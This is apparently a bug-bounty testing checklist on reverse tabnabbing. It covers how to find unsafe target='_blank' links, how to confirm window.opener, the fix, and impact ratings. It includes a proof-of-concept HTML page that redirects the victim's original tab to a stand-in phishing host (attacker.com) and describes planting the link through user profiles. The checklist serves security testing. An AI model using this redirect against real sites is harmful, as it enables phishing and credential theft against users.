# Tabnabbing / Reverse Tabnabbing

## Find Vulnerable Links

- [ ] Search page source for `target="_blank"` without `rel="noopener noreferrer"`:
  ```bash
  # In Burp — search response body
  # CLI on downloaded HTML
  grep -n 'target="_blank"' page.html | grep -v 'noopener'
  ```
- [ ] Check user-submitted content areas that render links (profiles, comments, bio fields)
- [ ] Check the application's own outbound links in navigation/footers

## Confirm window.opener is Not Null

- [ ] Open the linked page in a new tab — in the browser console run:
  ```javascript
  console.log(window.opener);
  // null = patched, object = vulnerable
  ```

## PoC — Exploit Reverse Tabnabbing

- [ ] Host this on attacker-controlled domain:
  ```html
  <html>
  <script>
  if (window.opener) {
    window.opener.location = 'https://attacker.com/phish';
  }
  </script>
  <body>Legitimate-looking content here</body>
  </html>
  ```
- [ ] Get the target app to link to your page with `target="_blank"` (e.g. submit link in profile)
- [ ] Click the link, observe background tab redirected to attacker domain

## Quick Check — Fix Expected

```html
<!-- Vulnerable -->
<a href="https://external.com" target="_blank">Link</a>

<!-- Fixed -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>
```

- [ ] Confirm if `rel="noopener noreferrer"` is absent on ALL external `_blank` links
- [ ] Check for dynamically injected links via JS (`document.createElement('a')`) — those also need `rel`

## Impact

- Reverse tabnabbing alone = Low/Informational on most programs
- Escalate: tabnabbing + login page redirect + credential theft = Medium/High
- Escalate: occurs in a high-trust context (banking, HR portal) = Medium

## References

- [HackerOne #260278](https://hackerone.com/reports/260278)
- [OWASP Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
